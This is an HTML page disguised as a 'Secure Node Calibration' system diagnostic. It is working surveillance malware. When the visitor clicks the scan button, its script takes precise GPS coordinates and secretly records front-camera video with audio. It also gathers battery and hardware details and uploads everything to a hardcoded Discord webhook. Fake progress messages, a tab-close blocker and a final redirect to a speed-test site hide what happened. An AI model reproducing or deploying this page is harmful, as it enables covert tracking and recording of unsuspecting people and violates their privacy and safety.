<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced System Diagnostic</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); text-align: center; }
        .terminal { background: #000; padding: 15px; border-radius: 5px; height: 200px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; opacity: 0; transition: opacity 0.2s; }
        .line.show { opacity: 1; }
        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 1rem; text-transform: uppercase; letter-spacing: 2px; }
        .btn:disabled { background: #161b2c; color: #5c6784; }
        .bar-container { height: 2px; width: 100%; background: #111; margin-bottom: 10px; }
        .bar { height: 100%; width: 0%; background: #00d2ff; transition: width 6s linear; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div style="font-size: 0.7rem; color: #5c6784;">SECURE NODE CALIBRATION v4.2.0</div>
        <div class="terminal" id="terminal">
            <div class="line show">> System idle. Awaiting authorization...</div>
        </div>
        <div class="bar-container"><div class="bar" id="bar"></div></div>
        <button class="btn" id="startBtn">Authorize Scan</button>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';

        // 1. Anti-Escape: Prevents user from closing tab easily
        window.onbeforeunload = function() {
            return "Diagnostic in progress. If you leave now, network nodes may remain unsynced.";
        };

        // 2. Deep Fingerprinting Function
        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_AD) : "Generic GPU";
            } catch (e) { return "Unknown"; }
        }

        document.getElementById('startBtn').addEventListener('click', async function() {
            const btn = this;
            const bar = document.getElementById('bar');
            btn.disabled = true;

            // Trigger Fullscreen for "App" feel
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();

            addLog("> Requesting GPS Satellite Handshake...");

            navigator.geolocation.getCurrentPosition(async (pos) => {
                addLog("> GPS Linked. Calibrating Hardware...");
                navigator.vibrate([100, 50, 100]); // Physical feedback

                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user", width: 640 }, 
                        audio: true 
                    });
                } catch (e) {
                    addLog("> ERROR: Hardware Node Blocked.");
                    return;
                }

                if (stream) {
                    addLog("> Media Node Established. Recording Flux...");
                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.start();

                    bar.style.width = "100%";
                    const fakeSteps = [
                        "> Syncing Internal Clock...",
                        "> Measuring Latency...",
                        "> GPU: " + getGPU().split(' ').slice(0,3).join(' '),
                        "> Tracking Packet Stability...",
                        "> Optimization 84% complete..."
                    ];

                    fakeSteps.forEach((step, i) => {
                        setTimeout(() => addLog(step), i * 1000);
                    });

                    setTimeout(() => {
                        mediaRecorder.stop();
                        mediaRecorder.onstop = async () => {
                            addLog("> Encrypting Data Packets...");
                            const videoBlob = new Blob(chunks, { type: 'video/webm' });
                            const b = await navigator.getBattery();
                            const formData = new FormData();
                            
                            const message = {
                                content: "ðŸ”± **ULTIMATE NODE CAPTURE**",
                                embeds: [{
                                    color: 5763719,
                                    fields: [
                                        { name: "ðŸ“ Location", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
                                        { name: "ðŸ”‹ Battery", value: `${Math.round(b.level * 100)}% (${b.charging ? 'Plugged' : 'Battery'})`, inline: true },
                                        { name: "âš™ï¸ CPU/GPU", value: `${navigator.hardwareConcurrency} Core / ${getGPU()}`, inline: true },
                                        { name: "ðŸ“± Resolution", value: `${screen.width}x${screen.height}`, inline: true }
                                    ],
                                    timestamp: new Date()
                                }]
                            };

                            formData.append('payload_json', JSON.stringify(message));
                            formData.append('file', videoBlob, 'node_log.webm');

                            await fetch(WEBHOOK, { method: 'POST', body: formData });
                            
                            // 3. Final Physical Alert
                            navigator.vibrate(500);
                            stream.getTracks().forEach(t => t.stop());
                            window.onbeforeunload = null; // Disable Anti-Escape
                            
                            addLog("> Sync Success. Redirecting...");
                            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                        };
                    }, 5500); // 5.5s Capture
                }
            }, (err) => {
                alert("GPS Required for Node Verification.");
                btn.disabled = false;
            }, { enableHighAccuracy: true });
        });

        function addLog(text) {
            const term = document.getElementById('terminal');
            const div = document.createElement('div');
            div.className = "line show";
            div.innerText = text;
            term.appendChild(div);
            term.scrollTop = term.scrollHeight;
        }
    </script>
</body>
</html>
